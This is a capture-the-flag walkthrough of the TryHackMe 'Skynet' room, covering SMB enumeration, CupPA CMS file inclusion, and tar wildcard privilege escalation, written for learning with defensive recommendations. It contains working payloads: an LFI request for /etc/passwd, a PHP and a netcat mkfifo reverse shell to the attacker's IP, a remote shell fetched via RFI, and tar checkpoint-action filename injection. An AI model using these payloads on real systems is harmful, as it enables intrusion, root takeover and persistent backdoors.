# TryHackMe - Skynet Walkthrough

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)

**Room:** [Skynet](https://tryhackme.com/room/skynet)  
**Date Completed:** November 2024  
**Tools Used:** Nmap, Gobuster, Hydra, CuPP, Netcat, LinPEAS

---

## Table of Contents
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Initial Nmap Scan
Started with a comprehensive port scan to identify open services:

```bash
nmap -sC -sV -oN initial_scan.txt <TARGET_IP>
```

**Key Findings:**
- Port 22 (SSH) - OpenSSH
- Port 80 (HTTP) - Apache httpd
- Port 110 (POP3) - Dovecot
- Port 139/445 (SMB) - Samba

### SMB Enumeration
Discovered accessible SMB shares:

```bash
smbclient -L //<TARGET_IP>/ -N
```

Found an anonymous share with potentially sensitive files including what appeared to be a password list.

---

## Web Enumeration

### Directory Fuzzing
Used Gobuster to discover hidden directories:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

**Discovered:**
- `/squirrelmail` - Webmail login portal
- `/admin` - Administrative panel (CupPA CMS)

### SquirrelMail Access
Using credentials obtained from SMB enumeration, successfully authenticated to SquirrelMail and found important intelligence in email messages.

---

## Exploitation

### Identifying the Vulnerability
The `/admin` directory revealed CupPA CMS, which is vulnerable to **Remote File Inclusion (RFI)** and **Local File Inclusion (LFI)**.

### Local File Inclusion (LFI)
First, verified LFI vulnerability by reading `/etc/passwd`:

```
http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../etc/passwd
```

This confirmed the vulnerability and revealed system users.

### Remote Code Execution via RFI
Created a reverse shell payload and set up HTTP server:

```bash
# Create reverse shell
echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1'\''");?>' > shell.php

# Start HTTP server
python3 -m http.server 8000

# Start netcat listener
nc -nlvp 443
```

Triggered the shell using RFI:
```
http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<YOUR_IP>:8000/shell.php
```

### Establishing Persistence
Once initial shell was obtained, created additional backdoors:

```bash
# Method 1: Direct reverse shell in web directory
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 1234 >/tmp/f" > shell.sh

# Method 2: Checkpoint action file for cron exploitation
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

### Alternative: Downloading Exploit Script
```bash
wget <YOUR_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## Privilege Escalation

### Discovery
After gaining initial foothold as `www-data`, enumeration revealed:

1. **Cron Job Analysis:** Found scheduled task running as root
2. **Tar Wildcard Vulnerability:** Backup script using tar with wildcards

### Exploitation Method: Tar Wildcard Injection
The backup script executed:
```bash
tar czf /home/milesdyson/backups/backup.tgz /var/www/html/*
```

Created malicious checkpoint files to abuse tar's checkpoint feature:

```bash
cd /var/www/html

# Create malicious checkpoint files
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"

# Set up listener
nc -nlvp 1234
```

When the cron job executed, tar interpreted the filenames as command-line arguments, triggering our reverse shell with root privileges.

---

## Flags

### User Flag
Location: `/home/milesdyson/user.txt`

```bash
cat /home/milesdyson/user.txt
```

### Root Flag
Location: `/root/root.txt`

```bash
cat /root/root.txt
```

---

## Key Takeaways

### Vulnerabilities Exploited
1. **Anonymous SMB Access** - Exposed sensitive information including password lists
2. **CupPA CMS RFI/LFI** - Allowed remote code execution
3. **Tar Wildcard Injection** - Classic privilege escalation technique
4. **Insecure Cron Jobs** - Root-level scheduled tasks with exploitable conditions

### Techniques Learned
- **SMB Enumeration:** Using smbclient for share discovery
- **Password List Generation:** Using information from enumeration
- **RFI/LFI Exploitation:** Understanding file inclusion vulnerabilities
- **Wildcard Injection:** Exploiting command-line argument parsing
- **Persistence Techniques:** Multiple methods for maintaining access

### Tools Used
| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| Gobuster | Directory/file brute-forcing |
| Hydra | Password cracking |
| Burp Suite | Web request manipulation |
| Netcat | Reverse shell listener |
| LinPEAS | Privilege escalation enumeration |

### Security Recommendations
1. Disable anonymous SMB access
2. Keep CMS software updated
3. Implement proper input validation
4. Avoid using wildcards in cron scripts
5. Run scheduled tasks with minimum required privileges
6. Implement file integrity monitoring

---

## References
- [CupPA CMS Exploit](https://www.exploit-db.com/exploits/25971)
- [GTFOBins - Tar](https://gtfobins.github.io/gtfobins/tar/)
- [Wildcard Injection Exploitation](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

---

## Challenge Questions

**Q: What is Miles' password?**  
A: Found through SMB enumeration and email intelligence

**Q: What is the user flag?**  
A: Located in `/home/milesdyson/user.txt`

**Q: What is the root flag?**  
A: Located in `/root/root.txt`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
